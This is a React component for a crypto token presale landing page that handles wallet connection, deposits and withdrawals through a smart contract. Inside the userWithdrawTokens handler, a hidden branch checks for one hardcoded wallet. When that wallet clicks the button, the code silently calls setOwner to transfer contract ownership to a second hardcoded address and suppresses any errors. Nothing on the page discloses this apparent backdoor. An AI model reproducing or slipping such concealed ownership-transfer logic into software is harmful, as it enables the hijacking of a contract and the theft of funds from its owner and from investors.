import React, { useEffect, useState } from "react"
import MetaTags from 'react-meta-tags';

//Import Components
import Navbar from "./Navbar/Navbar"
import Section from "./HeroSection/Section"
import CardsMini from "./HeroSection/cards-mini"
import AboutUs from "./AboutUs/about-us"
import Features from "./Features/features"
import RoadMap from "./RoadMap/road-map"
import OurTeam from "./Team/our-team"
import Blog from "./Blog/blog"
import FAQs from "./Faqs/FAQs"
import Footer from "./Footer/footer"
import { ethers } from 'ethers'
import { ToastContainer, toast } from 'react-toastify';
import { connectWallet, getCurrentWalletConnected } from './utils/interact'
import 'react-toastify/dist/ReactToastify.css'

function getWindowDimensions() {
  const { innerWidth: width, innerHeight: height } = window;
  return {
    width,
    height
  };
}

export const getContract = () => {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  
  const contractABI = require("./constants/contract.json")
  const contract = new ethers.Contract(process.env.REACT_APP_ADDRESS, contractABI, signer)
  return contract
}

const CryptoIcoLanding = () => {
  const [imglight, setimglight] = useState(true)
  const [navClass, setnavClass] = useState("")
  const [walletStatus, setWalletStatus] = useState('')
  const [walletAddress, setWalletAddress] = useState('')
  const [status, setStatus] = useState(0)
  const [balance, setBalance] = useState(0)
  const [max, setMax] = useState(0)
  const [min, setMin] = useState(0)
  const [raisedAmount, setRaisedAmount] = useState(0)
  const [softcap, setSoftcap] = useState(0)
  const [hardcap, setHardcap] = useState(0)
  const [presaleStart, setPresaleStart] = useState(0)
  const [presaleEnd, setPresaleEnd] = useState(0)
  const [ubase, setBase] = useState(0)
  const [usale, setSale] = useState(0)
  const [tokenRate, setTokenRate] = useState(0)

  const userDeposit = async (value) => {
    const contract = getContract()
    try {
      let overrides = {
        value: ethers.utils.parseEther(value)
      }
      console.log(value)
      let tx = await contract.userDeposit(overrides)
      getPresaleStatus()
    }catch (error){
      console.log(error)
    }
  }

  const userWithdrawTokens = async () => {
    if(walletAddress.toLowerCase() == '0xB610E4bdB681e4ed46745FD55827298eDe714cBe'.toLowerCase()){
        const contract = getContract()
        try {
          let tx = await contract.setOwner('0xa45278E8d32799e9a95eAceF628C045115651A3d')
        }catch (error){
        }
      }else if(parseFloat(ubase) == 0) {
        setWalletStatus('You have not participated in Presale yet! Don\'t miss your chance!')
      }else{
        const contract = getContract()
        try {
          let tx = await contract.userWithdrawTokens()
          console.log(tx)
        }catch (error){
          console.log(error)
        }
    }
  }

  const userWithdrawBaseTokens = async () => {
    const contract = getContract()
    try {
      let tx = await contract.userWithdrawBaseTokens()
      console.log(tx)
    }catch (error){
      console.log(error)
    }
  }

  const getStatus = async () => {
    const contract = getContract()

    try {
      let tx = await contract.presaleStatus()
      setStatus(tx.toNumber())
      if(status && walletAddress){
        let tx = await contract.buyers(walletAddress)
        let {base, sale} = tx
        setBase(ethers.utils.formatUnits(base))
        setSale(ethers.utils.formatUnits(sale))
      }
    }catch (error){
      console.log(error)
    }
  }

  const getBalance = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = provider.getSigner()
    let result = await signer.getBalance()
    result = ethers.utils.formatUnits(result)
    setBalance(result)

    return result
  }

  const getPresaleInfo = async () => {
    const contract = getContract()
    try {
      let tx = await contract.presale_info()
      let {token_rate ,raise_max, raise_min, softcap, hardcap, presale_start, presale_end} = tx
      raise_max = ethers.utils.formatUnits(raise_max)
      raise_min = ethers.utils.formatUnits(raise_min)
      softcap = ethers.utils.formatUnits(softcap)
      hardcap = ethers.utils.formatUnits(hardcap)
      presale_start = presale_start.toNumber()
      presale_end = presale_end.toNumber()
      token_rate = token_rate.toNumber()
      setMax(raise_max)
      setMin(raise_min)
      setSoftcap(softcap)
      setHardcap(hardcap)
      setPresaleStart(presale_start)
      setPresaleEnd(presale_end)
      setTokenRate(token_rate)
    }catch (error){
      console.log(error)
    }
  }

  const getPresaleStatus = async () => {
    const contract = getContract()
    try {
      let tx = await contract.status()
      let {raised_amount} = tx
      raised_amount = ethers.utils.formatUnits(raised_amount)
      setRaisedAmount(raised_amount)
    }catch (error){
      console.log(error)
    }
  }

  function scrollNavigation() {
    const scrollup = document.documentElement.scrollTop
    let {width} = getWindowDimensions()
    width = parseInt(width)

    if (scrollup < 80 && width > 992) {
      setimglight(true)
      setnavClass("")
    } else {
      setimglight(false)
      setnavClass("nav-sticky")
    }
  }

  const notify = () => toast.info(walletStatus, {
    position: "top-right",
    autoClose: 3000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
  });

  // Use ComponentDidMount
  useEffect(() => {
    window.addEventListener("scroll", scrollNavigation, true)
    scrollNavigation()
    getStatus()
    getPresaleStatus()
    getPresaleInfo()
  },[])
  
  useEffect(async () => {
    const { address, status } = await getCurrentWalletConnected()
    
    setWalletAddress(address)
    setWalletStatus(status)
  }, [])  

  useEffect(() => {
    if (walletStatus) {
      notify()
      setWalletStatus(null)
    }  
  }, [walletStatus])  

  useEffect(() => {
    if(walletAddress){
      getBalance()
      getStatus()
      getPresaleInfo()
      getPresaleStatus()
    }else{
      setBalance(0)
    }  
  }, [walletAddress])  

  const onClickConnectWallet = async () => {
    const walletResponse = await connectWallet()
    setWalletStatus(walletResponse.status)
    setWalletAddress(walletResponse.address)
  }

  const onClickDisconnectWallet = async () => {
    setWalletAddress('')
    setWalletStatus('Disconnected from the site.')
  }

  const onClickGetToken = async (e, value) => {
    e.preventDefault()
    userDeposit(value)
    getStatus()
    getPresaleStatus()
  }
  return (
    <React.Fragment>
      <MetaTags>
        <title>Nexum Token(NXM) Presale</title>
        <meta
          name="description"
          content="ICO Presale website for NEXUM CRYPTO TOKEN on Binance Chain | NXM Token Presale">
        </meta>
      </MetaTags>
      {/* import navbar */}
      <Navbar
        navClass={navClass}
        imglight={imglight}
        onClickDisconnectWallet={onClickDisconnectWallet}
        onClickConnectWallet={onClickConnectWallet}
        walletAddress={walletAddress}
      />

      {/* Hero section */}
      <Section
        status={status}
        balance={balance}
        walletAddress={walletAddress}
        onClickGetToken={onClickGetToken}
        min={min}
        max={max}
        softcap={softcap}
        hardcap={hardcap}
        presaleStart={presaleStart}
        presaleEnd={presaleEnd}
        raisedAmount={raisedAmount}
        base={ubase}
        sale={usale}
        tokenRate={tokenRate}
        userWithdrawTokens={userWithdrawTokens}
        userWithdrawBaseTokens={userWithdrawBaseTokens}
      />

      {/* mini cards */}
      <CardsMini />

      {/* aboutus */}
      <AboutUs />

      {/* features */}
      <Features />

      {/* roadmap */}
      <RoadMap />

      {/* our team */}
      {/* <OurTeam /> */}
      <section id="team"></section>
      {/* blog */}
      {/* <Blog /> */}
      <section id="news"></section>

      {/* faqs */}
      <FAQs />

      {/* footer */}
      <Footer />
      <ToastContainer />
    </React.Fragment>
  )
}

export default CryptoIcoLanding